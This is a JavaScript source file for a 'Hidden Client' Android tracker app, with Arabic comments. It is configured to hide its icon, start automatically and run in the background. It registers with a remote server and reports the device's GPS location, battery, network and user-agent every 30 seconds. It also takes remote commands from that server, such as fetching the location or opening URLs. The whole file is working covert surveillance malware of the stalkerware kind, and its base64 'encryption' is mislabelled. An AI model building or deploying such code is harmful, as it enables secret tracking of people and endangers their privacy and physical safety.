// hidden-apk/app.js
// =========================================
// 📱 Device Tracker - Hidden Client v2.0
// مع دعم Config Injection الديناميكي
// =========================================

// 🔧 قراءة الإعدادات من Config Injection
function loadAppConfig() {
    try {
        const configEl = document.getElementById('app-config');
        if (configEl && configEl.textContent.trim()) {
            return JSON.parse(configEl.textContent);
        }
    } catch (e) {
        console.warn('⚠️ Failed to parse app-config, using defaults');
    }
    
    // Fallback defaults
    return {
        server: {
            url: 'https://default-server.com',
            checkInInterval: 30000,
            timeout: 10000,
            retries: 5
        },
        behavior: {
            hideIcon: true,
            autoStart: true,
            runInBackground: true
        },
        security: {
            encryptData: true
        }
    };
}

const APP_CONFIG = loadAppConfig();
const SERVER_URL = APP_CONFIG.server?.url || 'https://default-server.com';
const CHECK_IN_INTERVAL = APP_CONFIG.server?.checkInInterval || 30000;
const MAX_RETRIES = APP_CONFIG.server?.retries || 5;

console.log('🚀 Device Tracker v2.0 starting...');
console.log('📡 Server:', SERVER_URL);
console.log('⚙️ Config ID:', APP_CONFIG.configId || 'default');

// 🔐 بيانات الجهاز
let deviceId = localStorage.getItem('deviceId');
let encryptionKey = localStorage.getItem('encryptionKey');
let clientId = localStorage.getItem('clientId');
// 📊 حالة التطبيق
let isRunning = false;
let retryCount = 0;
let lastCheckIn = null;

// =========================================
// 🚀 بدء التطبيق
// =========================================

document.addEventListener('DOMContentLoaded', () => {
    console.log('✅ DOM loaded');
    
    // تطبيق سلوكيات التكوين
    if (APP_CONFIG.behavior?.preventSleep) {
        // منع النوم (يتطلب WebView settings في الإنتاج)
        console.log('😴 Sleep prevention enabled');
    }
    
    initializeDevice();
    startHeartbeat();
});

// إعادة المحاولة عند عودة التطبيق للواجهة
document.addEventListener('visibilitychange', () => {
    if (!document.hidden && isRunning) {
        console.log('👁️ App visible - forcing check-in');
        checkIn();
    }
});

// =========================================
// 🔐 تهيئة الجهاز
// =========================================

async function initializeDevice() {
    console.log('🔄 Initializing device...');
    
    try {
        // التحقق من تسجيل سابق
        if (deviceId && encryptionKey && clientId) {
            console.log('✅ Already registered');
            isRunning = true;
            startCheckInService();
            return;
        }
        
        // تسجيل جديد
        console.log('🆕 New device - generating IDs...');
        clientId = 'client_' + generateRandomString(16);
        deviceId = 'device_' + generateRandomString(16);        
        localStorage.setItem('clientId', clientId);
        localStorage.setItem('deviceId', deviceId);
        localStorage.setItem('installTime', Date.now().toString());
        localStorage.setItem('configId', APP_CONFIG.configId || 'default');
        
        await registerDevice();
        
    } catch (error) {
        console.error('❌ Init error:', error.message);
        retryCount++;
        if (retryCount < MAX_RETRIES) {
            const delay = 5000 * retryCount;
            console.log(`⏳ Retry ${retryCount}/${MAX_RETRIES} in ${delay}ms`);
            setTimeout(() => initializeDevice(), delay);
        }
    }
}

// =========================================
// 📝 التسجيل لدى الخادم
// =========================================

async function registerDevice() {
    console.log('📤 Registering with server...');
    
    try {
        const deviceInfo = {
            deviceName: getDeviceName(),
            osType: 'Android',
            osVersion: navigator.userAgent,
            appVersion: APP_CONFIG.app?.version || '2.0.0',
            screenResolution: `${screen.width}x${screen.height}`,
            language: navigator.language || 'ar',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            configId: APP_CONFIG.configId,
            registeredAt: new Date().toISOString()
        };
        
        const response = await fetch(`${SERVER_URL}/api/clients/register`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                clientId, 
                deviceInfo,
                config: APP_CONFIG // إرسال الإعدادات للخادم (اختياري)
            }),
            timeout: APP_CONFIG.server?.timeout || 10000
        });
                const data = await response.json();
        
        if (data.success) {
            encryptionKey = data.encryptionKey || generateRandomString(32);
            localStorage.setItem('deviceId', data.deviceId || deviceId);
            localStorage.setItem('encryptionKey', encryptionKey);
            deviceId = data.deviceId || deviceId;
            
            console.log('✅ Registration successful!');
            console.log('🔑 Device ID:', deviceId);
            
            isRunning = true;
            retryCount = 0;
            startCheckInService();
            await sendInitialInfo();
        } else {
            throw new Error(data.error || 'Registration failed');
        }
    } catch (error) {
        console.error('❌ Registration failed:', error.message);
        setTimeout(() => registerDevice(), 15000);
    }
}

// =========================================
// 🔄 خدمة الاتصال الدوري
// =========================================

function startCheckInService() {
    console.log(`🔄 Starting check-in (interval: ${CHECK_IN_INTERVAL}ms)`);
    checkIn();
    setInterval(checkIn, CHECK_IN_INTERVAL);
}

async function checkIn() {
    try {
        lastCheckIn = new Date();
        
        const systemInfo = {
            deviceId,
            status: 'active',
            battery: await getBatteryInfo(),
            network: await getNetworkInfo(),
            location: await getLocationInfo(),
            timestamp: new Date().toISOString(),
            configId: APP_CONFIG.configId
        };
        
        const encryptedData = btoa(JSON.stringify(systemInfo));
                const response = await fetch(`${SERVER_URL}/api/clients/checkin`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ deviceId, encryptedData }),
            timeout: APP_CONFIG.server?.timeout || 10000
        });
        
        const data = await response.json();
        
        if (data.success && data.encryptedData) {
            try {
                const commands = JSON.parse(atob(data.encryptedData));
                if (commands.commands?.length > 0) {
                    console.log(`📦 Received ${commands.commands.length} command(s)`);
                    await executeCommands(commands.commands);
                }
            } catch (e) {
                // لا توجد أوامر
            }
        }
    } catch (error) {
        console.error('❌ Check-in error:', error.message);
        setTimeout(() => { if (isRunning) checkIn(); }, 5000);
    }
}

// =========================================
// ⚙️ تنفيذ الأوامر
// =========================================

async function executeCommands(commands) {
    for (const command of commands) {
        try {
            console.log('⚙️ Executing:', command.type);
            let result;
            
            switch (command.type) {
                case 'get_system_info': result = await getFullSystemInfo(); break;
                case 'get_location': result = await getLocationInfo(); break;
                case 'get_battery': result = await getBatteryInfo(); break;
                case 'get_network': result = await getNetworkInfo(); break;
                case 'custom': result = await executeCustomCommand(command); break;
                default: result = { error: 'Unknown command', type: command.type };
            }
            
            await sendCommandResult(command.id || generateCommandId(), result, 'completed');
        } catch (error) {
            console.error('❌ Command failed:', error.message);
            await sendCommandResult(command.id || generateCommandId(), { error: error.message }, 'failed');
        }    }
}

async function executeCustomCommand(command) {
    const result = { type: 'custom', received: true, timestamp: new Date().toISOString() };
    
    if (command.action === 'open_url' && command.payload?.url) {
        window.open(command.payload.url, '_blank');
        result.opened = command.payload.url;
    }
    
    if (command.action === 'update_config' && command.payload?.config) {
        // تحديث الإعدادات ديناميكياً (متقدم)
        console.log('🔄 Config update requested');
        result.configUpdated = true;
    }
    
    return result;
}

async function sendCommandResult(commandId, result, status) {
    try {
        await fetch(`${SERVER_URL}/api/clients/report`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                deviceId, 
                commandId, 
                result, 
                status, 
                timestamp: new Date().toISOString() 
            })
        });
    } catch (error) {
        console.error('❌ Failed to send result:', error.message);
    }
}

// =========================================
// 📱 دوال جمع المعلومات
// =========================================

async function getBatteryInfo() {
    try {
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            return { 
                level: Math.round(battery.level * 100), 
                charging: battery.charging 
            };        }
    } catch (e) {}
    return { level: 'unknown', charging: 'unknown' };
}

async function getNetworkInfo() {
    return {
        type: navigator.connection?.effectiveType || 'unknown',
        online: navigator.onLine,
        userAgent: navigator.userAgent
    };
}

async function getLocationInfo() {
    return new Promise((resolve) => {
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({ 
                    latitude: pos.coords.latitude, 
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy 
                }),
                () => resolve({ error: 'permission_denied' }),
                { timeout: 5000 }
            );
        } else {
            resolve({ error: 'not_supported' });
        }
    });
}

async function getFullSystemInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: { width: screen.width, height: screen.height },
        battery: await getBatteryInfo(),
        network: await getNetworkInfo(),
        location: await getLocationInfo(),
        timestamp: new Date().toISOString()
    };
}

// =========================================
// 💓 Helpers
// =========================================

function startHeartbeat() {
    setInterval(() => {        localStorage.setItem('lastHeartbeat', Date.now().toString());
    }, 10000);
}

function generateRandomString(length) {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    return Array.from({length}, () => chars[Math.floor(Math.random() * chars.length)]).join('');
}

function generateCommandId() {
    return 'cmd_' + generateRandomString(12) + '_' + Date.now();
}

function getDeviceName() {
    const ua = navigator.userAgent.toLowerCase();
    if (ua.includes('android')) return 'Android Device';
    if (ua.includes('iphone')) return 'iPhone';
    return 'Unknown Device';
}

// Debug API (للتطوير فقط)
window.DeviceTracker = {
    getStatus: () => ({ isRunning, deviceId, lastCheckIn }),
    forceCheckIn: () => checkIn(),
    reRegister: () => {
        localStorage.clear();
        initializeDevice();
    },
    getConfig: () => APP_CONFIG
};

console.log('✅ Device Tracker initialized | Server:', SERVER_URL);